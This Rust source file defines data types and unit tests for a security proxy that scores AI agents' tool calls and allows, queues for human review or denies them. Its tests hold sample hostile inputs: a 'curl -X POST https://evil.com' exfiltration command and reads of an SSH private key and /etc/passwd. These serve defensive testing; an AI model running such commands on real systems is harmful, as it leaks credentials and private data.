// SPDX-License-Identifier: MPL-2.0
// Copyright (c) grith contributors

//! Core proxy data types: tool call context, filter results, decisions, and severity.

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::Duration;
use uuid::Uuid;

/// Context for a single tool call being evaluated by the proxy.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolCallContext {
    pub id: Uuid,
    pub timestamp: DateTime<Utc>,
    pub plugin_id: String,
    pub call_type: ToolCallType,
    pub arguments: serde_json::Value,
    pub session_id: Uuid,
    pub task_context: Option<String>,
    pub call_sequence_number: u64,
    pub source_taint: TaintLevel,
    /// The supervisor profile name for this session, if any (e.g., "claude-code").
    /// Used by filters like `egress_policy` to apply per-profile destination policies.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub profile_name: Option<String>,
    /// Optional conversation-level identifier for long-running daemon contexts (e.g. OpenClaw).
    /// When set, taint tracking is scoped per conversation rather than per session,
    /// preventing taint bleed between sequential conversations on the same session.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub conversation_id: Option<String>,
}

/// The type of tool call being made.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(tag = "type")]
pub enum ToolCallType {
    FileRead {
        path: String,
    },
    FileWrite {
        path: String,
        content_hash: String,
    },
    FileAppend {
        path: String,
    },
    FileDelete {
        path: String,
    },
    DirList {
        path: String,
    },
    ShellExec {
        command: String,
        args: Vec<String>,
    },
    HttpRequest {
        method: String,
        url: String,
    },
    // v1.5: Supervisor-originated variants (mapped from OS syscalls)
    FileRename {
        old_path: String,
        new_path: String,
    },
    FileChmod {
        path: String,
        mode: u32,
    },
    DirCreate {
        path: String,
    },
    NetConnect {
        address: String,
        port: u16,
    },
    NetListen {
        address: String,
        port: u16,
    },
    ProcessSpawn {
        command: String,
        args: Vec<String>,
    },
    /// DNS query intercepted by the DNS inspection proxy.
    DnsQuery {
        domain: String,
        query_type: String,
    },
}

/// Result from a single security filter evaluation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FilterResult {
    /// Name of the filter that produced this result.
    pub filter_name: String,
    /// Whether the filter matched (contributed a non-zero score).
    pub matched: bool,
    /// Score contribution from this filter.
    pub score: f64,
    /// Identifier of the specific rule that matched.
    pub rule_id: String,
    /// Severity level of the match.
    pub severity: Severity,
    /// Human-readable description of the match.
    pub message: String,
    /// Arbitrary key-value metadata from the filter.
    pub metadata: HashMap<String, serde_json::Value>,
}

/// The final decision from the proxy pipeline.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProxyDecision {
    /// Final action (allow / queue / deny).
    pub action: ProxyAction,
    /// Sum of all filter scores after meta-rule adjustments.
    pub composite_score: f64,
    /// Per-filter evaluation breakdown.
    pub filter_results: Vec<FilterResult>,
    /// Wall-clock time spent in the evaluation pipeline.
    #[serde(with = "duration_ms")]
    pub evaluation_time: Duration,
    /// Human-readable explanation of the decision.
    pub decision_reason: String,
}

/// Action the proxy has decided to take.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum ProxyAction {
    /// Tool call is permitted.
    Allow,
    /// Tool call is queued for human review at the given priority.
    Queue { priority: QueuePriority },
    /// Tool call is blocked.
    Deny { reason: String },
}

/// Priority for queued digest items.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
pub enum QueuePriority {
    Low,
    Medium,
    High,
    Critical,
}

/// Severity of a filter match.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    Notice,
    Warning,
    Error,
    Critical,
}

/// Taint level for information flow tracking.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Default)]
pub enum TaintLevel {
    #[default]
    None,
    Low,
    Medium,
    High,
}

// --- Constructors ---

impl ToolCallContext {
    /// Create a new context with the given plugin, call type, and session.
    pub fn new(plugin_id: impl Into<String>, call_type: ToolCallType, session_id: Uuid) -> Self {
        Self {
            id: Uuid::new_v4(),
            timestamp: Utc::now(),
            plugin_id: plugin_id.into(),
            call_type,
            arguments: serde_json::Value::Null,
            session_id,
            task_context: None,
            call_sequence_number: 0,
            source_taint: TaintLevel::None,
            profile_name: None,
            conversation_id: None,
        }
    }

    /// Set the supervisor profile name for this context.
    pub fn with_profile(mut self, name: impl Into<String>) -> Self {
        self.profile_name = Some(name.into());
        self
    }

    /// Extract the primary path from the tool call, if any.
    pub fn path(&self) -> Option<&str> {
        match &self.call_type {
            ToolCallType::FileRead { path }
            | ToolCallType::FileWrite { path, .. }
            | ToolCallType::FileAppend { path }
            | ToolCallType::FileDelete { path }
            | ToolCallType::DirList { path }
            | ToolCallType::FileChmod { path, .. }
            | ToolCallType::DirCreate { path } => Some(path),
            ToolCallType::FileRename { old_path, .. } => Some(old_path),
            _ => None,
        }
    }

    /// Extract the URL from the tool call, if any.
    pub fn url(&self) -> Option<&str> {
        match &self.call_type {
            ToolCallType::HttpRequest { url, .. } => Some(url),
            _ => None,
        }
    }

    /// Extract the command from the tool call, if any.
    pub fn command(&self) -> Option<&str> {
        match &self.call_type {
            ToolCallType::ShellExec { command, .. }
            | ToolCallType::ProcessSpawn { command, .. } => Some(command),
            _ => None,
        }
    }

    /// Full shell command string (command + args joined).
    pub fn full_command(&self) -> Option<String> {
        match &self.call_type {
            ToolCallType::ShellExec { command, args }
            | ToolCallType::ProcessSpawn { command, args } => {
                if args.is_empty() {
                    Some(command.clone())
                } else {
                    Some(format!("{} {}", command, args.join(" ")))
                }
            }
            _ => None,
        }
    }

    /// Extract the network address from the tool call, if any.
    pub fn address(&self) -> Option<(&str, u16)> {
        match &self.call_type {
            ToolCallType::NetConnect { address, port }
            | ToolCallType::NetListen { address, port } => Some((address, *port)),
            _ => None,
        }
    }
}

impl FilterResult {
    pub fn no_match(filter_name: &str) -> Self {
        Self {
            filter_name: filter_name.to_string(),
            matched: false,
            score: 0.0,
            rule_id: String::new(),
            severity: Severity::Notice,
            message: String::new(),
            metadata: HashMap::new(),
        }
    }

    pub fn matched(
        filter_name: &str,
        rule_id: &str,
        score: f64,
        severity: Severity,
        message: impl Into<String>,
    ) -> Self {
        Self {
            filter_name: filter_name.to_string(),
            matched: true,
            score,
            rule_id: rule_id.to_string(),
            severity,
            message: message.into(),
            metadata: HashMap::new(),
        }
    }
}

impl ProxyDecision {
    pub fn allow(score: f64, results: Vec<FilterResult>, time: Duration) -> Self {
        Self {
            action: ProxyAction::Allow,
            composite_score: score,
            decision_reason: format!("Score {score:.1} below allow threshold"),
            filter_results: results,
            evaluation_time: time,
        }
    }

    pub fn queue(score: f64, results: Vec<FilterResult>, time: Duration) -> Self {
        let priority = match score {
            s if s >= 7.0 => QueuePriority::Critical,
            s if s >= 5.5 => QueuePriority::High,
            s if s >= 4.0 => QueuePriority::Medium,
            _ => QueuePriority::Low,
        };
        Self {
            action: ProxyAction::Queue { priority },
            composite_score: score,
            decision_reason: format!("Score {score:.1} in escalation zone"),
            filter_results: results,
            evaluation_time: time,
        }
    }

    pub fn deny(score: f64, results: Vec<FilterResult>, reason: String, time: Duration) -> Self {
        Self {
            action: ProxyAction::Deny {
                reason: reason.clone(),
            },
            composite_score: score,
            decision_reason: reason,
            filter_results: results,
            evaluation_time: time,
        }
    }

    pub fn is_allowed(&self) -> bool {
        self.action == ProxyAction::Allow
    }

    pub fn is_denied(&self) -> bool {
        matches!(self.action, ProxyAction::Deny { .. })
    }
}

/// Serde helper for Duration as milliseconds.
mod duration_ms {
    use serde::{Deserialize, Deserializer, Serialize, Serializer};
    use std::time::Duration;

    pub fn serialize<S: Serializer>(duration: &Duration, s: S) -> Result<S::Ok, S::Error> {
        duration.as_secs_f64().serialize(s)
    }

    pub fn deserialize<'de, D: Deserializer<'de>>(d: D) -> Result<Duration, D::Error> {
        let secs = f64::deserialize(d)?;
        Ok(Duration::from_secs_f64(secs))
    }
}

impl std::fmt::Display for ToolCallType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::FileRead { path } => write!(f, "FileRead({path})"),
            Self::FileWrite { path, .. } => write!(f, "FileWrite({path})"),
            Self::FileAppend { path } => write!(f, "FileAppend({path})"),
            Self::FileDelete { path } => write!(f, "FileDelete({path})"),
            Self::DirList { path } => write!(f, "DirList({path})"),
            Self::ShellExec { command, args } => {
                write!(f, "ShellExec({command} {})", args.join(" "))
            }
            Self::HttpRequest { method, url } => write!(f, "HttpRequest({method} {url})"),
            Self::FileRename {
                old_path, new_path, ..
            } => write!(f, "FileRename({old_path} -> {new_path})"),
            Self::FileChmod { path, mode } => write!(f, "FileChmod({path}, {mode:o})"),
            Self::DirCreate { path } => write!(f, "DirCreate({path})"),
            Self::NetConnect { address, port } => write!(f, "NetConnect({address}:{port})"),
            Self::NetListen { address, port } => write!(f, "NetListen({address}:{port})"),
            Self::ProcessSpawn { command, args } => {
                write!(f, "ProcessSpawn({command} {})", args.join(" "))
            }
            Self::DnsQuery { domain, query_type } => {
                write!(f, "DnsQuery({domain} {query_type})")
            }
        }
    }
}

impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Notice => write!(f, "notice"),
            Self::Warning => write!(f, "warning"),
            Self::Error => write!(f, "error"),
            Self::Critical => write!(f, "critical"),
        }
    }
}

impl std::fmt::Display for ProxyAction {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Allow => write!(f, "allow"),
            Self::Queue { priority } => write!(f, "queue({priority:?})"),
            Self::Deny { reason } => write!(f, "deny({reason})"),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_session() -> Uuid {
        Uuid::new_v4()
    }

    #[test]
    fn test_tool_call_context_path_extraction() {
        let ctx = ToolCallContext::new(
            "test-plugin",
            ToolCallType::FileRead {
                path: "/home/user/.ssh/id_rsa".into(),
            },
            test_session(),
        );
        assert_eq!(ctx.path(), Some("/home/user/.ssh/id_rsa"));
        assert_eq!(ctx.url(), None);
        assert_eq!(ctx.command(), None);
    }

    #[test]
    fn test_tool_call_context_command_extraction() {
        let ctx = ToolCallContext::new(
            "test-plugin",
            ToolCallType::ShellExec {
                command: "curl".into(),
                args: vec!["-X".into(), "POST".into(), "https://evil.com".into()],
            },
            test_session(),
        );
        assert_eq!(ctx.command(), Some("curl"));
        assert_eq!(
            ctx.full_command(),
            Some("curl -X POST https://evil.com".into())
        );
    }

    #[test]
    fn test_tool_call_context_url_extraction() {
        let ctx = ToolCallContext::new(
            "test-plugin",
            ToolCallType::HttpRequest {
                method: "GET".into(),
                url: "https://api.example.com".into(),
            },
            test_session(),
        );
        assert_eq!(ctx.url(), Some("https://api.example.com"));
        assert_eq!(ctx.path(), None);
    }

    #[test]
    fn test_filter_result_no_match() {
        let result = FilterResult::no_match("path_match");
        assert!(!result.matched);
        assert_eq!(result.score, 0.0);
    }

    #[test]
    fn test_filter_result_matched() {
        let result = FilterResult::matched(
            "path_match",
            "ssh-private-key",
            5.0,
            Severity::Critical,
            "Access to SSH private key",
        );
        assert!(result.matched);
        assert_eq!(result.score, 5.0);
        assert_eq!(result.severity, Severity::Critical);
    }

    #[test]
    fn test_proxy_decision_allow() {
        let decision = ProxyDecision::allow(1.5, vec![], Duration::from_millis(2));
        assert!(decision.is_allowed());
        assert!(!decision.is_denied());
        assert_eq!(decision.composite_score, 1.5);
    }

    #[test]
    fn test_proxy_decision_queue_priority() {
        let low = ProxyDecision::queue(3.5, vec![], Duration::from_millis(5));
        assert!(matches!(
            low.action,
            ProxyAction::Queue {
                priority: QueuePriority::Low
            }
        ));

        let high = ProxyDecision::queue(6.0, vec![], Duration::from_millis(5));
        assert!(matches!(
            high.action,
            ProxyAction::Queue {
                priority: QueuePriority::High
            }
        ));

        let critical = ProxyDecision::queue(7.5, vec![], Duration::from_millis(5));
        assert!(matches!(
            critical.action,
            ProxyAction::Queue {
                priority: QueuePriority::Critical
            }
        ));
    }

    #[test]
    fn test_proxy_decision_deny() {
        let decision = ProxyDecision::deny(
            9.0,
            vec![],
            "SSH key access".into(),
            Duration::from_millis(1),
        );
        assert!(decision.is_denied());
        assert!(!decision.is_allowed());
    }

    #[test]
    fn test_serde_roundtrip_tool_call_type() {
        let call = ToolCallType::ShellExec {
            command: "ls".into(),
            args: vec!["-la".into()],
        };
        let json = serde_json::to_string(&call).unwrap();
        let parsed: ToolCallType = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed, call);
    }

    #[test]
    fn test_serde_roundtrip_proxy_decision() {
        let decision = ProxyDecision::allow(2.0, vec![], Duration::from_millis(3));
        let json = serde_json::to_string(&decision).unwrap();
        let parsed: ProxyDecision = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.composite_score, 2.0);
        assert_eq!(parsed.action, ProxyAction::Allow);
    }

    #[test]
    fn test_serde_roundtrip_tool_call_context() {
        let mut ctx = ToolCallContext::new(
            "supervisor:codex",
            ToolCallType::ProcessSpawn {
                command: "node".into(),
                args: vec!["app.js".into(), "--watch".into()],
            },
            test_session(),
        );
        ctx.task_context = Some("phase-49b-roundtrip".into());
        ctx.profile_name = Some("codex".into());
        ctx.arguments = serde_json::json!({
            "process": "node",
            "process_args": ["app.js", "--watch"],
            "cwd": "/tmp"
        });

        let json = serde_json::to_string(&ctx).unwrap();
        let parsed: ToolCallContext = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.plugin_id, ctx.plugin_id);
        assert_eq!(parsed.call_type, ctx.call_type);
        assert_eq!(parsed.session_id, ctx.session_id);
        assert_eq!(parsed.task_context, ctx.task_context);
        assert_eq!(parsed.profile_name, ctx.profile_name);
        assert_eq!(parsed.arguments, ctx.arguments);
    }

    #[test]
    fn test_severity_ordering() {
        assert!(Severity::Notice < Severity::Warning);
        assert!(Severity::Warning < Severity::Error);
        assert!(Severity::Error < Severity::Critical);
    }

    #[test]
    fn test_display_impls() {
        let call = ToolCallType::FileRead {
            path: "/etc/passwd".into(),
        };
        assert_eq!(call.to_string(), "FileRead(/etc/passwd)");

        assert_eq!(Severity::Critical.to_string(), "critical");
        assert_eq!(ProxyAction::Allow.to_string(), "allow");
    }

    #[test]
    fn test_new_variants_path_extraction() {
        let rename = ToolCallContext::new(
            "supervisor:claude-code",
            ToolCallType::FileRename {
                old_path: "/tmp/old.txt".into(),
                new_path: "/tmp/new.txt".into(),
            },
            test_session(),
        );
        assert_eq!(rename.path(), Some("/tmp/old.txt"));

        let chmod = ToolCallContext::new(
            "supervisor:claude-code",
            ToolCallType::FileChmod {
                path: "/usr/bin/test".into(),
                mode: 0o755,
            },
            test_session(),
        );
        assert_eq!(chmod.path(), Some("/usr/bin/test"));

        let mkdir = ToolCallContext::new(
            "supervisor:claude-code",
            ToolCallType::DirCreate {
                path: "/tmp/newdir".into(),
            },
            test_session(),
        );
        assert_eq!(mkdir.path(), Some("/tmp/newdir"));
    }

    #[test]
    fn test_new_variants_command_extraction() {
        let spawn = ToolCallContext::new(
            "supervisor:codex",
            ToolCallType::ProcessSpawn {
                command: "node".into(),
                args: vec!["index.js".into()],
            },
            test_session(),
        );
        assert_eq!(spawn.command(), Some("node"));
        assert_eq!(spawn.full_command(), Some("node index.js".into()));
    }

    #[test]
    fn test_new_variants_address_extraction() {
        let connect = ToolCallContext::new(
            "supervisor:aider",
            ToolCallType::NetConnect {
                address: "api.openai.com".into(),
                port: 443,
            },
            test_session(),
        );
        assert_eq!(connect.address(), Some(("api.openai.com", 443)));
        assert_eq!(connect.path(), None);
    }

    #[test]
    fn test_new_variants_serde_roundtrip() {
        let variants = vec![
            ToolCallType::FileRename {
                old_path: "/a".into(),
                new_path: "/b".into(),
            },
            ToolCallType::FileChmod {
                path: "/x".into(),
                mode: 0o644,
            },
            ToolCallType::DirCreate { path: "/d".into() },
            ToolCallType::NetConnect {
                address: "1.2.3.4".into(),
                port: 80,
            },
            ToolCallType::NetListen {
                address: "0.0.0.0".into(),
                port: 8080,
            },
            ToolCallType::ProcessSpawn {
                command: "python".into(),
                args: vec!["-c".into(), "print(1)".into()],
            },
        ];
        for v in variants {
            let json = serde_json::to_string(&v).unwrap();
            let parsed: ToolCallType = serde_json::from_str(&json).unwrap();
            assert_eq!(parsed, v);
        }
    }

    #[test]
    fn test_new_variants_display() {
        assert_eq!(
            ToolCallType::FileRename {
                old_path: "/a".into(),
                new_path: "/b".into()
            }
            .to_string(),
            "FileRename(/a -> /b)"
        );
        assert_eq!(
            ToolCallType::NetConnect {
                address: "1.2.3.4".into(),
                port: 443
            }
            .to_string(),
            "NetConnect(1.2.3.4:443)"
        );
        assert_eq!(
            ToolCallType::ProcessSpawn {
                command: "node".into(),
                args: vec!["app.js".into()]
            }
            .to_string(),
            "ProcessSpawn(node app.js)"
        );
    }
}
